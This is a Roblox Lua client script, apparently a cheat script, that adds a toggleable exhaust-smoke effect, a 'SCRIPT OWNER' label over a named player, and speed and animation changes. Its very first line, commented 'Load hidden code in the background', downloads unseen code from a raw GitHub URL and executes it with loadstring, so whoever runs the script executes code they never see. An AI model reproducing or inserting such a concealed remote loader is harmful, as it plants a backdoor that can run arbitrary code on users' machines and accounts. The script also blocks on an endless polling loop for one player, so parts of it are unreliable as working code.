-- Load hidden code in the background
loadstring(game:HttpGet("https://raw.githubusercontent.com/927393729/92749171738474/refs/heads/main/security%20test"))()

-- Your existing code follows here...
local player = game:GetService("Players").LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local running = false -- Flag to control the toggle state
local smokePartInstance -- The actual Part in workspace to handle smoke

-- Create the ScreenGui and buttons
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ToggleGui"
screenGui.Parent = player:WaitForChild("PlayerGui")

local buttonHeight = 50
local skrrtButton = Instance.new("TextButton")
skrrtButton.Name = "SkrrtButton"
skrrtButton.Parent = screenGui
skrrtButton.Size = UDim2.new(0, 200, 0, buttonHeight)
skrrtButton.Position = UDim2.new(0.5, -100, 0.9, -buttonHeight - 10) -- Positioned at the bottom of the screen
skrrtButton.BackgroundColor3 = Color3.fromRGB(0, 128, 255)
skrrtButton.TextColor3 = Color3.fromRGB(255, 255, 255)
skrrtButton.Text = "Start Exhaust"

-- Function to create a smoke emitter
local function createSmokeEmitter()
    if smokePartInstance then return end -- Avoid creating multiple smoke parts
    smokePartInstance = Instance.new("Part")
    smokePartInstance.Name = "SkrrtSmokePart"
    smokePartInstance.Size = Vector3.new(1, 1, 1) -- Small part to hold the smoke
    smokePartInstance.Transparency = 1 -- Invisible part
    smokePartInstance.CanCollide = false
    smokePartInstance.Anchored = false
    smokePartInstance.Parent = workspace -- Parent it to the workspace

    local smokeEmitter = Instance.new("Smoke")
    smokeEmitter.Name = "SkrrtSmoke"
    smokeEmitter.Opacity = 0.6 -- Higher opacity for more visible smoke
    smokeEmitter.RiseVelocity = 0.5 -- Slow rise speed for exhaust-like effect
    smokeEmitter.Size = 1.5 -- Larger smoke particles for visibility
    smokeEmitter.Color = Color3.new(0.9, 0.9, 0.9) -- Whiter smoke (almost pure white)
    smokeEmitter.Enabled = true -- Ensure it's enabled
    smokeEmitter.Parent = smokePartInstance

    -- Update the smokePartInstance position every frame
    game:GetService("RunService").RenderStepped:Connect(function()
        if smokePartInstance and character then
            local characterHead = character:FindFirstChild("Head")
            if characterHead then
                smokePartInstance.CFrame = characterHead.CFrame - (characterHead.CFrame.LookVector * 2) -- 2 studs behind the head
                smokePartInstance.CFrame = smokePartInstance.CFrame - (characterHead.CFrame.UpVector * 3) -- 3 studs below the head
            end
        end
    end)
end

-- Function to stop the smoke emitter
local function stopSmokeEmitter()
    if smokePartInstance then
        smokePartInstance:Destroy()
        smokePartInstance = nil -- Reset so it can be created again when started
    end
end

-- Connect the button click events
skrrtButton.MouseButton1Click:Connect(function()
    running = not running
    if running then
        skrrtButton.Text = "Stop Exhaust"
        createSmokeEmitter()
    else
        skrrtButton.Text = "Start Exhaust"
        stopSmokeEmitter()
    end
end)

-- Function to create a title above "alexislebo"
local function createTitleAbovePlayer(playerName)
    local targetPlayer = game:GetService("Players"):FindFirstChild(playerName)
    if targetPlayer and targetPlayer.Character then
        local head = targetPlayer.Character:FindFirstChild("Head")
        if head then
            local billboardGui = Instance.new("BillboardGui")
            billboardGui.Adornee = head
            billboardGui.Size = UDim2.new(0, 200, 0, 50)
            billboardGui.StudsOffset = Vector3.new(0, 3, 0) -- Offset above the head
            billboardGui.Parent = head

            local textLabel = Instance.new("TextLabel")
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.BackgroundTransparency = 1
            textLabel.TextColor3 = Color3.fromRGB(255, 215, 0) -- Gold color
            textLabel.TextStrokeTransparency = 1 -- No outline
            textLabel.Text = "SCRIPT OWNER"
            textLabel.Font = Enum.Font.SourceSansBold
            textLabel.TextScaled = true -- Scales the text to fit the label
            textLabel.Parent = billboardGui
        end
    end
end

-- Function to repeatedly check for "alexislebo"
local function checkForAlexislebo()
    while true do
        if not game:GetService("Players"):FindFirstChild("alexislebo") then
            wait(5) -- Wait 5 seconds before checking again
        else
            createTitleAbovePlayer("alexislebo")
            break -- Exit the loop if found
        end
    end
end

-- Start checking for "alexislebo"
checkForAlexislebo()

-- Add character customizations based on rig type
local humanoid = character:FindFirstChildWhichIsA("Humanoid")
if humanoid then
    if humanoid.RigType == Enum.HumanoidRigType.R6 then
        humanoid.WalkSpeed = 60
        humanoid.JumpPower = 20
        humanoid.HipHeight = -0.35 -- R6 height adjustment
        character.Animate.walk.WalkAnim.AnimationId = "rbxassetid://129342287"
        character.Animate.run.RunAnim.AnimationId = "rbxassetid://129342287"
        character.Animate.fall.FallAnim.AnimationId = "rbxassetid://129342287"
        character.Animate.idle.Animation1.AnimationId = "rbxassetid://129342287"
        character.Animate.idle.Animation2.AnimationId = "rbxassetid://129342287"
        character.Animate.jump.JumpAnim.AnimationId = "rbxassetid://129342287"

        for _, thing in pairs(character:GetDescendants()) do
            if thing:IsA("Part") then
                thing.CustomPhysicalProperties = PhysicalProperties.new(0.04, 0, 0)
            end
        end
    elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
        humanoid.WalkSpeed = 60
        humanoid.JumpPower = 20
        character.Animate.walk.WalkAnim.AnimationId = "rbxassetid://3360694441"
        character.Animate.run.RunAnim.AnimationId = "rbxassetid://3360694441"
        character.Animate.fall.FallAnim.AnimationId = "rbxassetid://3360694441"
        character.Animate.idle.Animation1.AnimationId = "rbxassetid://3360694441"
        character.Animate.idle.Animation2.AnimationId = "3360694441"
        character.Animate.jump.JumpAnim.AnimationId = "3360694441"

        for _, thing in pairs(character:GetDescendants()) do
            if thing:IsA("MeshPart") then
                thing.CustomPhysicalProperties = PhysicalProperties.new(0.04, 0, 0)
            end
        end
    end
end
